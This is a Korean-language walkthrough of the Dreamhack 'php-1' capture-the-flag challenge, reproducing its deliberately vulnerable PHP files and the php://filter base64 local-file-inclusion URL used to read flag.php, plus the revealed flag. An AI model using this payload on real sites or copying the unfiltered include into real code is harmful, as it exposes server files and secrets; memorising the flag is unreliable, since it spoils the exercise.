https://honey-push-30b.notion.site/php-1-5634ab896f5143d8981c193e398d8df6
# 문제파일 다운로드

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9296985c-b0ee-4a0f-b013-2959310bee34/%EB%AC%B8%EC%A0%9C.png)

php-1 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. LFI를 이용하라고 문제에 힌트가 나와있고 플래그는 /var/www/uploads/flag.php에 있음을 알 수 있다. 다운로드 받으면 4개의 php 파일(index.php,list.php,main.php,view.php)을 받을 수 있다.

이때 LFI는 Local File Inclusion 의 약자로 php파일 내부에 있는 include ,include_once,require,require_once 함수를 통해 사용자의 입력값으로 페이지를 받는다면 Wrapper를 이용해 공격이 가능하다. 그러면 php파일에서 include나 require함수의 존재를 찾아보자.

# index.php

```python
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>PHP Back Office</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">PHP Back Office</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/?page=list">List</a></li>
            <li><a href="/?page=view">View</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/>
    <div class="container">
      <?php
          include $_GET['page']?$_GET['page'].'.php':'main.php';
      ?>
    </div> 
</body>
</html>
```

include $_GET[’page’]를 통해서 사용자로부터 page에 담긴 값을 받아서 있으면 그 값에.php를 붙인 페이지를 없다면 main.php를 읽어서 php 코드를 실행시키는 부분이 있음을 볼 수 있다. 처음에 이것을 제대로 찾지 못해서 한참 헤맸다.

# list.php

```python
<h2>List</h2>
<?php
    $directory = '../uploads/';
    $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
    foreach ($scanned_directory as $key => $value) {
        echo "<li><a href='/?page=view&file={$directory}{$value}'>".$value."</a></li><br/>";
    }
?>
```

../uploads/에 있는 파일들의 리스트를 보여주고 누르면 view페이지에 page의 값으로 그 파일을 넣어주어 전달해준다.

# main.php

```python
<h2>Back Office!</h2>
```

별 내용은 없고 index페이지에서 이 php코드가 실행되어서 보여지는 것을 보여주기 위한 main.php파일이다.

# view.php

```python
<h2>View</h2>
<pre><?php
    $file = $_GET['file']?$_GET['file']:'';
    if(preg_match('/flag|:/i', $file)){
        exit('Permission denied');
    }
    echo file_get_contents($file);
?>
</pre>
```

처음에 이 view.php에서 한참 헤맸다. preg_match로 /flag나 : 가 필터링 되어있기에 이 페이지말고 다른 페이지를 통해서 접근 해야 한다.

# 문제 풀이

[https://learn.dreamhack.io/15#40](https://learn.dreamhack.io/15#40) 에 있는 Wrapper 중 php://filter는 내가 원하는 방식을 이용하여 원하는 파일을 출력시킬수있다. 바로 원하는 파일을 출력하지 않는 이유는 원하는 파일이 php태그가 있는 파일인경우 include내에서 출력되면 php코드를 인식하여 출력해주기 때문이다. 즉 소스코드 전체를 보기위해서는 소스코드를 base64로 인코딩하여 php코드로 인식못하게 만들어 출력한 후 그 값을 디코딩하여 소스코드를 추출한다.

index.php 페이지를 잠깐 살펴보자 

```python

    <div class="container">
      <?php
          include $_GET['page']?$_GET['page'].'.php':'main.php';
      ?>
    </div> 
```

index 페이지에서 필터링 없이 page를 사용자로 부터 get으로 받아 include로 포함시키는 부분이 있으므로 문제에서 언급한 flag.php의 위치인 /var/www/uploads/flag를 이용해서 출력해주자. 이 때 index.php의 코드를 자세히 살펴보면 .php는 사용자의 입력값에다가 추가로 뒤에 붙여주므로 .php를 써주면 안된다.

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/256e7d6e-8ade-46bc-b30d-fdfe02594f12/flag.png)

따라서 http://host3.dreamhack.games:9222/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag 를 통하여 flag.php를 출력하였다. 

가려져서 잘 안보이지만 복사해보면 PD9waHAKCSRmbGFnID0gJ0RIe2JiOWRiMWYzMDNjYWNmMGYzYzkxZTBhYmNhMTIyMWZmfSc7Cj8+CmNhbiB5b3Ugc2VlICRmbGFnPw== 가 출력되며 소스코드가 base64로 인코딩 된 값이 나온다.

[https://www.convertstring.com/ko/EncodeDecode/Base64Decode](https://www.convertstring.com/ko/EncodeDecode/Base64Decode) 에서 base64 디코딩을 해주었다.

![디코딩.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4a63a2f5-456a-4f00-92e1-da9db5496bf5/%EB%94%94%EC%BD%94%EB%94%A9.png)

이를 base64 디코딩을 한 소스코드에서 플래그값인DH{bb9db1f303cacf0f3c91e0abca1221ff}를 찾을 수 있다.
